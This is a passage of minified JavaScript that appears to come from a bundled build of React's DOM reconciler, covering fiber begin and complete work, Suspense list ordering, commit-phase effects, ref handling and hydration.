D?(_h(),te=g.fallback,D=d.mode,ce=u.child,Ae=ce.sibling,g=gd(ce,{mode:"hidden",children:g.children}),g.subtreeFlags=ce.subtreeFlags&65011712,Ae!==null?te=gd(Ae,te):(te=k0(te,D,p,null),te.flags|=2),te.return=d,g.return=d,g.sibling=te,d.child=g,Zw(null,g),g=d.child,te=u.child.memoizedState,te===null?te=AP(p):(D=te.cachePool,D!==null?(ce=_i._currentValue,D=D.parent!==ce?{parent:ce,pool:ce}:D):D=GU(),te={baseLanes:te.baseLanes|p,cachePool:D}),g.memoizedState=te,g.childLanes=CP(u,K,p),d.memoizedState=_P,Zw(u.child,g)):(Eh(d),p=u.child,u=p.sibling,p=gd(p,{mode:"visible",children:g.children}),p.return=d,p.sibling=null,u!==null&&(K=d.deletions,K===null?(d.deletions=[u],d.flags|=16):K.push(u)),d.child=p,d.memoizedState=null,p)}function SP(u,d){return d=K5({mode:"visible",children:d},u.mode),d.return=u,u.child=d}function K5(u,d){return u=Sa(22,u,null,d),u.lanes=0,u}function TP(u,d,p){return F0(d,u.child,null,p),u=SP(d,d.pendingProps.children),u.flags|=2,d.memoizedState=null,u}function oF(u,d,p){u.lanes|=d;var g=u.alternate;g!==null&&(g.lanes|=d),$R(u.return,d,p)}function xP(u,d,p,g,D,F){var K=u.memoizedState;K===null?u.memoizedState={isBackwards:d,rendering:null,renderingStartTime:0,last:g,tail:p,tailMode:D,treeForkCount:F}:(K.isBackwards=d,K.rendering=null,K.renderingStartTime=0,K.last=g,K.tail=p,K.tailMode=D,K.treeForkCount=F)}function aF(u,d,p){var g=d.pendingProps,D=g.revealOrder,F=g.tail;g=g.children;var K=di.current,te=(K&2)!==0;if(te?(K=K&1|2,d.flags|=128):K&=1,G(di,K),ps(u,d,g,p),g=gn?jw:0,!te&&u!==null&&(u.flags&128)!==0)e:for(u=d.child;u!==null;){if(u.tag===13)u.memoizedState!==null&&oF(u,p,d);else if(u.tag===19)oF(u,p,d);else if(u.child!==null){u.child.return=u,u=u.child;continue}if(u===d)break e;for(;u.sibling===null;){if(u.return===null||u.return===d)break e;u=u.return}u.sibling.return=u.return,u=u.sibling}switch(D){case"forwards":for(p=d.child,D=null;p!==null;)u=p.alternate,u!==null&&j5(u)===null&&(D=p),p=p.sibling;p=D,p===null?(D=d.child,d.child=null):(D=p.sibling,p.sibling=null),xP(d,!1,D,p,F,g);break;case"backwards":case"unstable_legacy-backwards":for(p=null,D=d.child,d.child=null;D!==null;){if(u=D.alternate,u!==null&&j5(u)===null){d.child=D;break}u=D.sibling,D.sibling=p,p=D,D=u}xP(d,!0,p,null,F,g);break;case"together":xP(d,!1,null,null,void 0,g);break;default:d.memoizedState=null}return d.child}function _d(u,d,p){if(u!==null&&(d.dependencies=u.dependencies),Sh|=d.lanes,(p&d.childLanes)===0)if(u!==null){if(ky(u,d,p,!1),(p&d.childLanes)===0)return null}else return null;if(u!==null&&d.child!==u.child)throw Error(r(153));if(d.child!==null){for(u=d.child,p=gd(u,u.pendingProps),d.child=p,p.return=d;u.sibling!==null;)u=u.sibling,p=p.sibling=gd(u,u.pendingProps),p.return=d;p.sibling=null}return d.child}function IP(u,d){return(u.lanes&d)!==0?!0:(u=u.dependencies,!!(u!==null&&I5(u)))}function dpe(u,d,p){switch(d.tag){case 3:le(d,d.stateNode.containerInfo),yh(d,_i,u.memoizedState.cache),D0();break;case 27:case 5:ue(d);break;case 4:le(d,d.stateNode.containerInfo);break;case 10:yh(d,d.type,d.memoizedProps.value);break;case 31:if(d.memoizedState!==null)return d.flags|=128,XR(d),null;break;case 13:var g=d.memoizedState;if(g!==null)return g.dehydrated!==null?(Eh(d),d.flags|=128,null):(p&d.child.childLanes)!==0?sF(u,d,p):(Eh(d),u=_d(u,d,p),u!==null?u.sibling:null);Eh(d);break;case 19:var D=(u.flags&128)!==0;if(g=(p&d.childLanes)!==0,g||(ky(u,d,p,!1),g=(p&d.childLanes)!==0),D){if(g)return aF(u,d,p);d.flags|=128}if(D=d.memoizedState,D!==null&&(D.rendering=null,D.tail=null,D.lastEffect=null),G(di,di.current),g)break;return null;case 22:return d.lanes=0,XL(u,d,p,d.pendingProps);case 24:yh(d,_i,u.memoizedState.cache)}return _d(u,d,p)}function cF(u,d,p){if(u!==null)if(u.memoizedProps!==d.pendingProps)Ci=!0;else{if(!IP(u,p)&&(d.flags&128)===0)return Ci=!1,dpe(u,d,p);Ci=(u.flags&131072)!==0}else Ci=!1,gn&&(d.flags&1048576)!==0&&FU(d,jw,d.index);switch(d.lanes=0,d.tag){case 16:e:{var g=d.pendingProps;if(u=U0(d.elementType),d.type=u,typeof u=="function")kR(u)?(g=H0(u,g),d.tag=1,d=rF(null,d,u,g,p)):(d.tag=0,d=EP(null,d,u,g,p));else{if(u!=null){var D=u.$$typeof;if(D===v){d.tag=11,d=YL(null,d,u,g,p);break e}else if(D===_){d.tag=14,d=QL(null,d,u,g,p);break e}}throw d=q(u)||u,Error(r(306,d,""))}}return d;case 0:return EP(u,d,d.type,d.pendingProps,p);case 1:return g=d.type,D=H0(g,d.pendingProps),rF(u,d,g,D,p);case 3:e:{if(le(d,d.stateNode.containerInfo),u===null)throw Error(r(387));g=d.pendingProps;var F=d.memoizedState;D=F.element,KR(u,d),qw(d,g,null,p);var K=d.memoizedState;if(g=K.cache,yh(d,_i,g),g!==F.cache&&HR(d,[_i],p,!0),zw(),g=K.element,F.isDehydrated)if(F={element:g,isDehydrated:!1,cache:K.cache},d.updateQueue.baseState=F,d.memoizedState=F,d.flags&256){d=iF(u,d,g,p);break e}else if(g!==D){D=hc(Error(r(424)),d),Mw(D),d=iF(u,d,g,p);break e}else{switch(u=d.stateNode.containerInfo,u.nodeType){case 9:u=u.body;break;default:u=u.nodeName==="HTML"?u.ownerDocument.body:u}for(Rr=bc(u.firstChild),fs=d,gn=!0,mh=null,gc=!0,p=XU(d,null,g,p),d.child=p;p;)p.flags=p.flags&-3|4096,p=p.sibling}else{if(D0(),g===D){d=_d(u,d,p);break e}ps(u,d,g,p)}d=d.child}return d;case 26:return G5(u,d),u===null?(p=w$(d.type,null,d.pendingProps,null))?d.memoizedState=p:gn||(p=d.type,u=d.pendingProps,g=l3(ne.current).createElement(p),g[Ir]=d,g[Jr]=u,ms(g,p,u),zr(g),d.stateNode=g):d.memoizedState=w$(d.type,u.memoizedProps,d.pendingProps,u.memoizedState),null;case 27:return ue(d),u===null&&gn&&(g=d.stateNode=g$(d.type,d.pendingProps,ne.current),fs=d,gc=!0,D=Rr,Ph(d.type)?(aN=D,Rr=bc(g.firstChild)):Rr=D),ps(u,d,d.pendingProps.children,p),G5(u,d),u===null&&(d.flags|=4194304),d.child;case 5:return u===null&&gn&&((D=g=Rr)&&(g=$pe(g,d.type,d.pendingProps,gc),g!==null?(d.stateNode=g,fs=d,Rr=bc(g.firstChild),gc=!1,D=!0):D=!1),D||gh(d)),ue(d),D=d.type,F=d.pendingProps,K=u!==null?u.memoizedProps:null,g=F.children,nN(D,F)?g=null:K!==null&&nN(D,K)&&(d.flags|=32),d.memoizedState!==null&&(D=tP(u,d,npe,null,null,p),lv._currentValue=D),G5(u,d),ps(u,d,g,p),d.child;case 6:return u===null&&gn&&((u=p=Rr)&&(p=Hpe(p,d.pendingProps,gc),p!==null?(d.stateNode=p,fs=d,Rr=null,u=!0):u=!1),u||gh(d)),null;case 13:return sF(u,d,p);case 4:return le(d,d.stateNode.containerInfo),g=d.pendingProps,u===null?d.child=F0(d,null,g,p):ps(u,d,g,p),d.child;case 11:return YL(u,d,d.type,d.pendingProps,p);case 7:return ps(u,d,d.pendingProps,p),d.child;case 8:return ps(u,d,d.pendingProps.children,p),d.child;case 12:return ps(u,d,d.pendingProps.children,p),d.child;case 10:return g=d.pendingProps,yh(d,d.type,g.value),ps(u,d,g.children,p),d.child;case 9:return D=d.type._context,g=d.pendingProps.children,j0(d),D=hs(D),g=g(D),d.flags|=1,ps(u,d,g,p),d.child;case 14:return QL(u,d,d.type,d.pendingProps,p);case 15:return JL(u,d,d.type,d.pendingProps,p);case 19:return aF(u,d,p);case 31:return lpe(u,d,p);case 22:return XL(u,d,p,d.pendingProps);case 24:return j0(d),g=hs(_i),u===null?(D=VR(),D===null&&(D=ur,F=zR(),D.pooledCache=F,F.refCount++,F!==null&&(D.pooledCacheLanes|=p),D=F),d.memoizedState={parent:g,cache:D},GR(d),yh(d,_i,D)):((u.lanes&p)!==0&&(KR(u,d),qw(d,null,null,p),zw()),D=u.memoizedState,F=d.memoizedState,D.parent!==g?(D={parent:g,cache:g},d.memoizedState=D,d.lanes===0&&(d.memoizedState=d.updateQueue.baseState=D),yh(d,_i,g)):(g=F.cache,yh(d,_i,g),g!==D.cache&&HR(d,[_i],p,!0))),ps(u,d,d.pendingProps.children,p),d.child;case 29:throw d.pendingProps}throw Error(r(156,d.tag))}function Ad(u){u.flags|=4}function RP(u,d,p,g,D){if((d=(u.mode&32)!==0)&&(d=!1),d){if(u.flags|=16777216,(D&335544128)===D)if(u.stateNode.complete)u.flags|=8192;else if(BF())u.flags|=8192;else throw L0=O5,WR}else u.flags&=-16777217}function uF(u,d){if(d.type!=="stylesheet"||(d.state.loading&4)!==0)u.flags&=-16777217;else if(u.flags|=16777216,!C$(d))if(BF())u.flags|=8192;else throw L0=O5,WR}function Z5(u,d){d!==null&&(u.flags|=4),u.flags&16384&&(d=u.tag!==22?el():536870912,u.lanes|=d,Vy|=d)}function Yw(u,d){if(!gn)switch(u.tailMode){case"hidden":d=u.tail;for(var p=null;d!==null;)d.alternate!==null&&(p=d),d=d.sibling;p===null?u.tail=null:p.sibling=null;break;case"collapsed":p=u.tail;for(var g=null;p!==null;)p.alternate!==null&&(g=p),p=p.sibling;g===null?d||u.tail===null?u.tail=null:u.tail.sibling=null:g.sibling=null}}function Pr(u){var d=u.alternate!==null&&u.alternate.child===u.child,p=0,g=0;if(d)for(var D=u.child;D!==null;)p|=D.lanes|D.childLanes,g|=D.subtreeFlags&65011712,g|=D.flags&65011712,D.return=u,D=D.sibling;else for(D=u.child;D!==null;)p|=D.lanes|D.childLanes,g|=D.subtreeFlags,g|=D.flags,D.return=u,D=D.sibling;return u.subtreeFlags|=g,u.childLanes=p,d}function fpe(u,d,p){var g=d.pendingProps;switch(MR(d),d.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Pr(d),null;case 1:return Pr(d),null;case 3:return p=d.stateNode,g=null,u!==null&&(g=u.memoizedState.cache),d.memoizedState.cache!==g&&(d.flags|=2048),wd(_i),oe(),p.pendingContext&&(p.context=p.pendingContext,p.pendingContext=null),(u===null||u.child===null)&&(Oy(d)?Ad(d):u===null||u.memoizedState.isDehydrated&&(d.flags&256)===0||(d.flags|=1024,LR())),Pr(d),null;case 26:var D=d.type,F=d.memoizedState;return u===null?(Ad(d),F!==null?(Pr(d),uF(d,F)):(Pr(d),RP(d,D,null,g,p))):F?F!==u.memoizedState?(Ad(d),Pr(d),uF(d,F)):(Pr(d),d.flags&=-16777217):(u=u.memoizedProps,u!==g&&Ad(d),Pr(d),RP(d,D,u,g,p)),null;case 27:if(be(d),p=ne.current,D=d.type,u!==null&&d.stateNode!=null)u.memoizedProps!==g&&Ad(d);else{if(!g){if(d.stateNode===null)throw Error(r(166));return Pr(d),null}u=Z.current,Oy(d)?HU(d):(u=g$(D,g,p),d.stateNode=u,Ad(d))}return Pr(d),null;case 5:if(be(d),D=d.type,u!==null&&d.stateNode!=null)u.memoizedProps!==g&&Ad(d);else{if(!g){if(d.stateNode===null)throw Error(r(166));return Pr(d),null}if(F=Z.current,Oy(d))HU(d);else{var K=l3(ne.current);switch(F){case 1:F=K.createElementNS("http://www.w3.org/2000/svg",D);break;case 2:F=K.createElementNS("http://www.w3.org/1998/Math/MathML",D);break;default:switch(D){case"svg":F=K.createElementNS("http://www.w3.org/2000/svg",D);break;case"math":F=K.createElementNS("http://www.w3.org/1998/Math/MathML",D);break;case"script":F=K.createElement("div"),F.innerHTML="<script><\/script>",F=F.removeChild(F.firstChild);break;case"select":F=typeof g.is=="string"?K.createElement("select",{is:g.is}):K.createElement("select"),g.multiple?F.multiple=!0:g.size&&(F.size=g.size);break;default:F=typeof g.is=="string"?K.createElement(D,{is:g.is}):K.createElement(D)}}F[Ir]=d,F[Jr]=g;e:for(K=d.child;K!==null;){if(K.tag===5||K.tag===6)F.appendChild(K.stateNode);else if(K.tag!==4&&K.tag!==27&&K.child!==null){K.child.return=K,K=K.child;continue}if(K===d)break e;for(;K.sibling===null;){if(K.return===null||K.return===d)break e;K=K.return}K.sibling.return=K.return,K=K.sibling}d.stateNode=F;e:switch(ms(F,D,g),D){case"button":case"input":case"select":case"textarea":g=!!g.autoFocus;break e;case"img":g=!0;break e;default:g=!1}g&&Ad(d)}}return Pr(d),RP(d,d.type,u===null?null:u.memoizedProps,d.pendingProps,p),null;case 6:if(u&&d.stateNode!=null)u.memoizedProps!==g&&Ad(d);else{if(typeof g!="string"&&d.stateNode===null)throw Error(r(166));if(u=ne.current,Oy(d)){if(u=d.stateNode,p=d.memoizedProps,g=null,D=fs,D!==null)switch(D.tag){case 27:case 5:g=D.memoizedProps}u[Ir]=d,u=!!(u.nodeValue===p||g!==null&&g.suppressHydrationWarning===!0||s$(u.nodeValue,p)),u||gh(d,!0)}else u=l3(u).createTextNode(g),u[Ir]=d,d.stateNode=u}return Pr(d),null;case 31:if(p=d.memoizedState,u===null||u.memoizedState!==null){if(g=Oy(d),p!==null){if(u===null){if(!g)throw Error(r(318));if(u=d.memoizedState,u=u!==null?u.dehydrated:null,!u)throw Error(r(557));u[Ir]=d}else D0(),(d.flags&128)===0&&(d.memoizedState=null),d.flags|=4;Pr(d),u=!1}else p=LR(),u!==null&&u.memoizedState!==null&&(u.memoizedState.hydrationErrors=p),u=!0;if(!u)return d.flags&256?(xa(d),d):(xa(d),null);if((d.flags&128)!==0)throw Error(r(558))}return Pr(d),null;case 13:if(g=d.memoizedState,u===null||u.memoizedState!==null&&u.memoizedState.dehydrated!==null){if(D=Oy(d),g!==null&&g.dehydrated!==null){if(u===null){if(!D)throw Error(r(318));if(D=d.memoizedState,D=D!==null?D.dehydrated:null,!D)throw Error(r(317));D[Ir]=d}else D0(),(d.flags&128)===0&&(d.memoizedState=null),d.flags|=4;Pr(d),D=!1}else D=LR(),u!==null&&u.memoizedState!==null&&(u.memoizedState.hydrationErrors=D),D=!0;if(!D)return d.flags&256?(xa(d),d):(xa(d),null)}return xa(d),(d.flags&128)!==0?(d.lanes=p,d):(p=g!==null,u=u!==null&&u.memoizedState!==null,p&&(g=d.child,D=null,g.alternate!==null&&g.alternate.memoizedState!==null&&g.alternate.memoizedState.cachePool!==null&&(D=g.alternate.memoizedState.cachePool.pool),F=null,g.memoizedState!==null&&g.memoizedState.cachePool!==null&&(F=g.memoizedState.cachePool.pool),F!==D&&(g.flags|=2048)),p!==u&&p&&(d.child.flags|=8192),Z5(d,d.updateQueue),Pr(d),null);case 4:return oe(),u===null&&QP(d.stateNode.containerInfo),Pr(d),null;case 10:return wd(d.type),Pr(d),null;case 19:if(V(di),g=d.memoizedState,g===null)return Pr(d),null;if(D=(d.flags&128)!==0,F=g.rendering,F===null)if(D)Yw(g,!1);else{if(ti!==0||u!==null&&(u.flags&128)!==0)for(u=d.child;u!==null;){if(F=j5(u),F!==null){for(d.flags|=128,Yw(g,!1),u=F.updateQueue,d.updateQueue=u,Z5(d,u),d.subtreeFlags=0,u=p,p=d.child;p!==null;)MU(p,u),p=p.sibling;return G(di,di.current&1|2),gn&&yd(d,g.treeForkCount),d.child}u=u.sibling}g.tail!==null&&Nn()>e3&&(d.flags|=128,D=!0,Yw(g,!1),d.lanes=4194304)}else{if(!D)if(u=j5(F),u!==null){if(d.flags|=128,D=!0,u=u.updateQueue,d.updateQueue=u,Z5(d,u),Yw(g,!0),g.tail===null&&g.tailMode==="hidden"&&!F.alternate&&!gn)return Pr(d),null}else 2*Nn()-g.renderingStartTime>e3&&p!==536870912&&(d.flags|=128,D=!0,Yw(g,!1),d.lanes=4194304);g.isBackwards?(F.sibling=d.child,d.child=F):(u=g.last,u!==null?u.sibling=F:d.child=F,g.last=F)}return g.tail!==null?(u=g.tail,g.rendering=u,g.tail=u.sibling,g.renderingStartTime=Nn(),u.sibling=null,p=di.current,G(di,D?p&1|2:p&1),gn&&yd(d,g.treeForkCount),u):(Pr(d),null);case 22:case 23:return xa(d),JR(),g=d.memoizedState!==null,u!==null?u.memoizedState!==null!==g&&(d.flags|=8192):g&&(d.flags|=8192),g?(p&536870912)!==0&&(d.flags&128)===0&&(Pr(d),d.subtreeFlags&6&&(d.flags|=8192)):Pr(d),p=d.updateQueue,p!==null&&Z5(d,p.retryQueue),p=null,u!==null&&u.memoizedState!==null&&u.memoizedState.cachePool!==null&&(p=u.memoizedState.cachePool.pool),g=null,d.memoizedState!==null&&d.memoizedState.cachePool!==null&&(g=d.memoizedState.cachePool.pool),g!==p&&(d.flags|=2048),u!==null&&V(M0),null;case 24:return p=null,u!==null&&(p=u.memoizedState.cache),d.memoizedState.cache!==p&&(d.flags|=2048),wd(_i),Pr(d),null;case 25:return null;case 30:return null}throw Error(r(156,d.tag))}function hpe(u,d){switch(MR(d),d.tag){case 1:return u=d.flags,u&65536?(d.flags=u&-65537|128,d):null;case 3:return wd(_i),oe(),u=d.flags,(u&65536)!==0&&(u&128)===0?(d.flags=u&-65537|128,d):null;case 26:case 27:case 5:return be(d),null;case 31:if(d.memoizedState!==null){if(xa(d),d.alternate===null)throw Error(r(340));D0()}return u=d.flags,u&65536?(d.flags=u&-65537|128,d):null;case 13:if(xa(d),u=d.memoizedState,u!==null&&u.dehydrated!==null){if(d.alternate===null)throw Error(r(340));D0()}return u=d.flags,u&65536?(d.flags=u&-65537|128,d):null;case 19:return V(di),null;case 4:return oe(),null;case 10:return wd(d.type),null;case 22:case 23:return xa(d),JR(),u!==null&&V(M0),u=d.flags,u&65536?(d.flags=u&-65537|128,d):null;case 24:return wd(_i),null;case 25:return null;default:return null}}function lF(u,d){switch(MR(d),d.tag){case 3:wd(_i),oe();break;case 26:case 27:case 5:be(d);break;case 4:oe();break;case 31:d.memoizedState!==null&&xa(d);break;case 13:xa(d);break;case 19:V(di);break;case 10:wd(d.type);break;case 22:case 23:xa(d),JR(),u!==null&&V(M0);break;case 24:wd(_i)}}function Qw(u,d){try{var p=d.updateQueue,g=p!==null?p.lastEffect:null;if(g!==null){var D=g.next;p=D;do{if((p.tag&u)===u){g=void 0;var F=p.create,K=p.inst;g=F(),K.destroy=g}p=p.next}while(p!==D)}}catch(te){Yn(d,d.return,te)}}function Ah(u,d,p){try{var g=d.updateQueue,D=g!==null?g.lastEffect:null;if(D!==null){var F=D.next;g=F;do{if((g.tag&u)===u){var K=g.inst,te=K.destroy;if(te!==void 0){K.destroy=void 0,D=d;var ce=p,Ae=te;try{Ae()}catch(De){Yn(D,ce,De)}}}g=g.next}while(g!==F)}}catch(De){Yn(d,d.return,De)}}function dF(u){var d=u.updateQueue;if(d!==null){var p=u.stateNode;try{tL(d,p)}catch(g){Yn(u,u.return,g)}}}function fF(u,d,p){p.props=H0(u.type,u.memoizedProps),p.state=u.memoizedState;try{p.componentWillUnmount()}catch(g){Yn(u,d,g)}}function Jw(u,d){try{var p=u.ref;if(p!==null){switch(u.tag){case 26:case 27:case 5:var g=u.stateNode;break;case 30:g=u.stateNode;break;default:g=u.stateNode}typeof p=="function"?u.refCleanup=p(g):p.current=g}}catch(D){Yn(u,d,D)}}function gl(u,d){var p=u.ref,g=u.refCleanup;if(p!==null)if(typeof g=="function")try{g()}catch(D){Yn(u,d,D)}finally{u.refCleanup=null,u=u.alternate,u!=null&&(u.refCleanup=null)}else if(typeof p=="function")try{p(null)}catch(D){Yn(u,d,D)}else p.current=null}function hF(u){var d=u.type,p=u.memoizedProps,g=u.stateNode;try{e:switch(d){case"button":case"input":case"select":case"textarea":p.autoFocus&&g.focus();break e;case"img":p.src?g.src=p.src:p.srcSet&&(g.srcset=p.srcSet)}}catch(D){Yn(u,u.return,D)}}function PP(u,d,p){try{var g=u.stateNode;Bpe(g,u.type,p,d),g[Jr]=d}catch(D){Yn(u,u.return,D)}}function pF(u){return u.tag===5||u.tag===3||u.tag===26||u.tag===27&&Ph(u.type)||u.tag===4}function NP(u){e:for(;;){for(;u.sibling===null;){if(u.return===null||pF(u.return))return null;u=u.return}for(u.sibling.return=u.return,u=u.sibling;u.tag!==5&&u.tag!==6&&u.tag!==18;){if(u.tag===27&&Ph(u.type)||u.flags&2||u.child===null||u.tag===4)continue e;u.child.return=u,u=u.child}if(!(u.flags&2))return u.stateNode}}function OP(u,d,p){var g=u.tag;if(g===5||g===6)u=u.stateNode,d?(p.nodeType===9?p.body:p.nodeName==="HTML"?p.ownerDocument.body:p).insertBefore(u,d):(d=p.nodeType===9?p.body:p.nodeName==="HTML"?p.ownerDocument.body:p,d.appendChild(u),p=p._reactRootContainer,p!=null||d.onclick!==null||(d.onclick=_a));else if(g!==4&&(g===27&&Ph(u.type)&&(p=u.stateNode,d=null),u=u.child,u!==null))for(OP(u,d,p),u=u.sibling;u!==null;)OP(u,d,p),u=u.sibling}function Y5(u,d,p){var g=u.tag;if(g===5||g===6)u=u.stateNode,d?p.insertBefore(u,d):p.appendChild(u);else if(g!==4&&(g===27&&Ph(u.type)&&(p=u.stateNode),u=u.child,u!==null))for(Y5(u,d,p),u=u.sibling;u!==null;)Y5(u,d,p),u=u.sibling}function mF(u){var d=u.stateNode,p=u.memoizedProps;try{for(var g=u.type,D=d.attributes;D.length;)d.removeAttributeNode(D[0]);ms(d,g,p),d[Ir]=u,d[Jr]=p}catch(F){Yn(u,u.return,F)}}var Cd=!1,Si=!1,kP=!1,gF=typeof WeakSet=="function"?WeakSet:Set,Wi=null;function ppe(u,d){if(u=u.containerInfo,eN=y3,u=IU(u),TR(u)){if("selectionStart"in u)var p={start:u.selectionStart,end:u.selectionEnd};else e:{p=(p=u.ownerDocument)&&p.defaultView||window;var g=p.getSelection&&p.getSelection();if(g&&g.rangeCount!==0){p=g.anchorNode;var D=g.anchorOffset,F=g.focusNode;g=g.focusOffset;try{p.nodeType,F.nodeType}catch{p=null;break e}var K=0,te=-1,ce=-1,Ae=0,De=0,Le=u,Se=null;t:for(;;){for(var Pe;Le!==p||D!==0&&Le.nodeType!==3||(te=K+D),Le!==F||g!==0&&Le.nodeType!==3||(ce=K+g),Le.nodeType===3&&(K+=Le.nodeValue.length),(Pe=Le.firstChild)!==null;)Se=Le,Le=Pe;for(;;){if(Le===u)break t;if(Se===p&&++Ae===D&&(te=K),Se===F&&++De===g&&(ce=K),(Pe=Le.nextSibling)!==null)break;Le=Se,Se=Le.parentNode}Le=Pe}p=te===-1||ce===-1?null:{start:te,end:ce}}else p=null}p=p||{start:0,end:0}}else p=null;for(tN={focusedElem:u,selectionRange:p},y3=!1,Wi=d;Wi!==null;)if(d=Wi,u=d.child,(d.subtreeFlags&1028)!==0&&u!==null)u.return=d,Wi=u;else for(;Wi!==null;){switch(d=Wi,F=d.alternate,u=d.flags,d.tag){case 0:if((u&4)!==0&&(u=d.updateQueue,u=u!==null?u.events:null,u!==null))for(p=0;p<u.length;p++)D=u[p],D.ref.impl=D.nextImpl;break;case 11:case 15:break;case 1:if((u&1024)!==0&&F!==null){u=void 0,p=d,D=F.memoizedProps,F=F.memoizedState,g=p.stateNode;try{var vt=H0(p.type,D);u=g.getSnapshotBeforeUpdate(vt,F),g.__reactInternalSnapshotBeforeUpdate=u}catch(Ut){Yn(p,p.return,Ut)}}break;case 3:if((u&1024)!==0){if(u=d.stateNode.containerInfo,p=u.nodeType,p===9)iN(u);else if(p===1)switch(u.nodeName){case"HEAD":case"HTML":case"BODY":iN(u);break;default:u.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((u&1024)!==0)throw Error(r(163))}if(u=d.sibling,u!==null){u.return=d.return,Wi=u;break}Wi=d.return}}function yF(u,d,p){var g=p.flags;switch(p.tag){case 0:case 11:case 15:Td(u,p),g&4&&Qw(5,p);break;case 1:if(Td(u,p),g&4)if(u=p.stateNode,d===null)try{u.componentDidMount()}catch(K){Yn(p,p.return,K)}else{var D=H0(p.type,d.memoizedProps);d=d.memoizedState;try{u.componentDidUpdate(D,d,u.__reactInternalSnapshotBeforeUpdate)}catch(K){Yn(p,p.return,K)}}g&64&&dF(p),g&512&&Jw(p,p.return);break;case 3:if(Td(u,p),g&64&&(u=p.updateQueue,u!==null)){if(d=null,p.child!==null)switch(p.child.tag){case 27:case 5:d=p.child.stateNode;break;case 1:d=p.child.stateNode}try{tL(u,d)}catch(K){Yn(p,p.return,K)}}break;case 27:d===null&&g&4&&mF(p);case 26:case 5:Td(u,p),d===null&&g&4&&hF(p),g&512&&Jw(p,p.return);break;case 12:Td(u,p);break;case 31:Td(u,p),g&4&&vF(u,p);break;case 13:Td(u,p),g&4&&EF(u,p),g&64&&(u=p.memoizedState,u!==null&&(u=u.dehydrated,u!==null&&(p=Ape.bind(null,p),zpe(u,p))));break;case 22:if(g=p.memoizedState!==null||Cd,!g){d=d!==null&&d.memoizedState!==null||Si,D=Cd;var F=Si;Cd=g,(Si=d)&&!F?xd(u,p,(p.subtreeFlags&8772)!==0):Td(u,p),Cd=D,Si=F}break;case 30:break;default:Td(u,p)}}function bF(u){var d=u.alternate;d!==null&&(u.alternate=null,bF(d)),u.child=null,u.deletions=null,u.sibling=null,u.tag===5&&(d=u.stateNode,d!==null&&nl(d)),u.stateNode=null,u.return=null,u.dependencies=null,u.memoizedProps=null,u.memoizedState=null,u.pendingProps=null,u.stateNode=null,u.updateQueue=null}var Br=null,Do=!1;function Sd(u,d,p){for(p=p.child;p!==null;)wF(u,d,p),p=p.sibling}function wF(u,d,p){if(xr&&typeof xr.onCommitFiberUnmount=="function")try{xr.onCommitFiberUnmount(Hr,p)}catch{}switch(p.tag){case 26:Si||gl(p,d),Sd(u,d,p),p.memoizedState?p.memoizedState.count--:p.stateNode&&(p=p.stateNode,p.parentNode.removeChild(p));break;case 27:Si||gl(p,d);var g=Br,D=Do;Ph(p.type)&&(Br=p.stateNode,Do=!1),Sd(u,d,p),av(p.stateNode),Br=g,Do=D;break;case 5:Si||gl(p,d);case 6:if(g=Br,D=Do,Br=null,Sd(u,d,p),Br=g,Do=D,Br!==null)if(Do)try{(Br.nodeType===9?Br.body:Br.nodeName==="HTML"?Br.ownerDocument.body:Br).removeChild(p.stateNode)}catch(F){Yn(p,d,F)}else try{Br.removeChild(p.stateNode)}catch(F){Yn(p,d,F)}break;case 18:Br!==null&&(Do?(u=Br,d$(u.nodeType===9?u.body:u.nodeName==="HTML"?u.ownerDocument.body:u,p.stateNode),Xy(u)):d$(Br,p.stateNode));break;case 4:g=Br,D=Do,Br=p.stateNode.containerInfo,Do=!0,Sd(u,d,p),Br=g,Do=D;break;case 0:case 11:case 14:case 15:Ah(2,p,d),Si||Ah(4,p,d),Sd(u,d,p);break;case 1:Si||(gl(p,d),g=p.stateNode,typeof g.componentWillUnmount=="function"&&fF(p,d,g)),Sd(u,d,p);break;case 21:Sd(u,d,p);break;case 22:Si=(g=Si)||p.memoizedState!==null,Sd(u,d,p),Si=g;break;default:Sd(u,d,p)}}function vF(u,d){if(d.memoizedState===null&&(u=d.alternate,u!==null&&(u=u.memoizedState,u!==null))){u=u.dehydrated;try{Xy(u)}catch(p){Yn(d,d.return,p)}}}function EF(u,d){if(d.memoizedState===null&&(u=d.alternate,u!==null&&(u=u.memoizedState,u!==null&&(u=u.dehydrated,u!==null))))try{Xy(u)}catch(p){Yn(d,d.return,p)}}function mpe(u){switch(u.tag){case 31:case 13:case 19:var d=u.stateNode;return d===null&&(d=u.stateNode=new gF),d;case 22:return u=u.stateNode,d=u._retryCache,d===null&&(d=u._retryCache=new gF),d;default:throw Error(r(435,u.tag))}}function Q5(u,d){var p=mpe(u);d.forEach(function(g){if(!p.has(g)){p.add(g);var D=Cpe.bind(null,u,g);g.then(D,D)}})}function Bo(u,d){var p=d.deletions;if(p!==null)for(var g=0;g<p.length;g++){var D=p[g],F=u,K=d,te=K;e:for(;te!==null;){switch(te.tag){case 27:if(Ph(te.type)){Br=te.stateNode,Do=!1;break e}break;case 5:Br=te.stateNode,Do=!1;break e;case 3:case 4:Br=te.stateNode.containerInfo,Do=!0;break e}te=te.return}if(Br===null)throw Error(r(160));wF(F,K,D),Br=null,Do=!1,F=D.alternate,F!==null&&(F.return=null),D.return=null}if(d.subtreeFlags&13886)for(d=d.child;d!==null;)_F(d,u),d=d.sibling}var uu=null;function _F(u,d){var p=u.alternate,g=u.flags;switch(u.tag){case 0:case 11:case 14:case 15:Bo(d,u),jo(u),g&4&&(Ah(3,u,u.return),Qw(3,u),Ah(5,u,u.return));break;case 1:Bo(d,u),jo(u),g&512&&(Si||p===null||gl(p,p.return)),g&64&&Cd&&(u=u.updateQueue,u!==null&&(g=u.callbacks,g!==null&&(p=u.shared.hiddenCallbacks,u.shared.hiddenCallbacks=p===null?g:p.concat(g))));break;case 26:var D=uu;if(Bo(d,u),jo(u),g&512&&(Si||p===null||gl(p,p.return)),g&4){var F=p!==null?p.memoizedState:null;if(g=u.memoizedState,p===null)if(g===null)if(u.stateNode===null){e:{g=u.type,p=u.memoizedProps,D=D.ownerDocument||D;t:switch(g){case"title":F=D.getElementsByTagName("title")[0],(!F||F[Po]||F[Ir]||F.namespaceURI==="http://www.w3.org/2000/svg"||F.hasAttribute("itemprop"))&&(F=D.createElement(g),D.head.insertBefore(F,D.querySelector("head > title"))),ms(F,g,p),F[Ir]=u,zr(F),g=F;break e;case"link":var K=_$("link","href",D).get(g+(p.href||""));if(K){for(var 